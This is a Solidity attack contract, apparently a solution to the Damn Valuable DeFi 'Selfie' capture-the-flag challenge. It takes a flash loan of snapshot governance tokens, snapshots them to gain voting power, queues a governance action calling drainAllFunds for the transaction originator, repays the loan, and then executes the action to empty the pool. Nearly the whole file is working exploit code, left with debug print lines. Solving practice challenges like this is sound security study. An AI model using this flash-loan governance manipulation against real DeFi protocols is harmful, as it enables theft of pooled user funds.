pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";

interface ISimpleGovernance{
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface IFlashLoan{
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface IDVTSnapshot {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function snapshot() external returns (uint256);
}

contract AttackerSelfie{
    address private immutable attacker;
    ISimpleGovernance private immutable simpleGovernance;
    IFlashLoan private immutable flashLoan;
    uint256 public actionId;

    constructor(address _simpleGovernance, address _flashLoan){
        attacker = msg.sender;
        simpleGovernance = ISimpleGovernance(_simpleGovernance);
        flashLoan = IFlashLoan(_flashLoan);
    }

    function receiveTokens(address token ,uint256 amount) public {
        IDVTSnapshot(token).snapshot();
        // Return the flash loan
        // Queue governance action
        console.log("here1 ");
        actionId = simpleGovernance.queueAction(
                    address(flashLoan), 
                    abi.encodeWithSignature(
                        "drainAllFunds(address)",
                        tx.origin
                    ),
                    0
        );
                console.log("here2 ");
        IDVTSnapshot(token).transfer(address(flashLoan), amount);
                console.log("here3 ");
    }

    function attack(uint256 amount) external{
        flashLoan.flashLoan(amount);
    }

     function drainToAttacker() external {
        simpleGovernance.executeAction(uint256(actionId));
    }
}

